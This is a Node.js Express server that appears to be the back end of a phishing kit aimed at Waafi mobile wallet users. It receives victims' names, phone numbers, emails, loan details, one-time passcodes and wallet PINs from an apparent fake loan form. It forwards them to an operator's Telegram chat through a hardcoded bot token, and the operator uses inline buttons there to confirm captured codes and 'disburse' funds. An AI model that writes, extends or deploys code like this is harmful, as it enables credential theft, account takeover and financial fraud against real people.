const express = require('express');
const app = express();
const axios = require('axios');

app.use(express.json());

app.get('/', (req, res) => {
    res.json({ status: "Telegram Microservice Endpoint Matrix Active" });
});

const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8962560334:AAE-876Pd841650yQjPGfa8rUOPTtr1SJiQ';
const TELEGRAM_CHAT_ID = process.env.ADMIN_CHAT_ID || '6362923717';

let rawServerUrl = process.env.SERVER_CORE_URL || 'http://localhost:3000';
if (!rawServerUrl.startsWith('http://') && !rawServerUrl.startsWith('https://')) {
    rawServerUrl = 'https://' + rawServerUrl;
}
const SERVER_CORE_URL = rawServerUrl;

// STEP 3: Silent logging notification panel. Completely stripped of interactive buttons.
app.post('/log-step3-data', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`📝 <b>New Profile Received (Auto-Advanced)</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Name:</b> ${session.firstName} ${session.lastName}
• <b>Phone:</b> +252${session.phone}
• <b>Email:</b> ${session.email}
• <b>Amount Required:</b> $${Number(session.amount).toLocaleString()}
• <b>Employment Status:</b> ${session.employment} ($${Number(session.income).toLocaleString()})
━━━━━━━━━━━━━━━━━━━━━━━━
Status: <i>Forwarded directly to user OTP submission pane...</i>`;

    sendToTelegram(txt, null);
});

// STEP 4: Actionable operational panel. Appears ONLY when user executes manual OTP submit action.
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`🔐 <b>Waafi Intercept - Step 4: OTP Captured</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Target Contact:</b> +252${session.phone}
• <b>Submitted Verification OTP:</b> <code>${session.otpToken}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
            { text: "❌ WRONG OTP", callback_data: `reject_otp:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// STEP 5: Final administrative intercept confirmation dashboard
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`💳 <b>Waafi Intercept - Step 5: Secure Wallet PIN</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Target Contact:</b> +252${session.phone}
• <b>Wallet Transaction PIN:</b> <code>${session.pinCode}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "💰 APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
            { text: "❌ WRONG PIN", callback_data: `reject_pin:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// =========================================================================
// INTERACTIVE BOT BUTTON DISPATCH CONTROLLER ROUTE
// =========================================================================
app.post('/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const { callback_query } = req.body;
    if (!callback_query || !callback_query.data) return;

    const [actionSignal, targetAppId] = callback_query.data.split(':');
    let logMessage = '';
    let apiRouteSignal = actionSignal;

    if (actionSignal === 'approve_otp') {
        logMessage = "✅ OTP token accepted. Target unlocked onto safe PIN acquisition stream.";
    } else if (actionSignal === 'reject_otp') {
        apiRouteSignal = 'otp-failed';
        logMessage = "❌ OTP token declared invalid. Clear state triggered back to user.";
    } else if (actionSignal === 'approve_pin') {
        logMessage = "💰 DISBURSED! Secure wallet access execution validated. Success page populated.";
    } else if (actionSignal === 'reject_pin') {
        apiRouteSignal = 'pin-failed';
        logMessage = "❌ Access PIN signature rejected. Correction workflow initialized.";
    }

    try {
        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
            actionSignal: apiRouteSignal,
            targetAppId: targetAppId
        });

        if (response.data.success) {
            updateTelegramMessageUI(callback_query.message, logMessage);
        }
    } catch (err) {
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "⚠️ Core instance unreachable or thread instance dropped.",
                show_alert: true
            });
        } catch (e) {}
    }
});

async function sendToTelegram(text, replyMarkup) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
    } catch (e) { console.error("Telegram API communication drop:", e.message); }
}

async function updateTelegramMessageUI(msgObj, statusText) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: msgObj.message_id,
            text: `${msgObj.text}\n\n🤖 <b>System Log:</b>\n<i>${statusText}</i>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {}
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Bot manager daemon active on port ${PORT}`));